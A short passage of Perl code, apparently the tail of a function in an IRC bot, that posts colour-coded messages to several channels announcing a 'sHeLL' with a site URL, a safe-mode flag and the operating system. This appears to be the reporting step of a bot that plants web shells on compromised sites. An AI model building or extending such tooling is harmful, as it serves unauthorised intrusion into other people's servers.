&msg("$inject","$logo4$engine 12sHeLL4 ".$url." 14$safe $os");
        &msg("$channel","$logo4$engine 12sHeLL4 ".$url." 14$safe $os");
        &msg("$chanxxx","$logo4$engine 12sHeLL4 ".$url." 14$safe $os");
	}
	return @print;
}

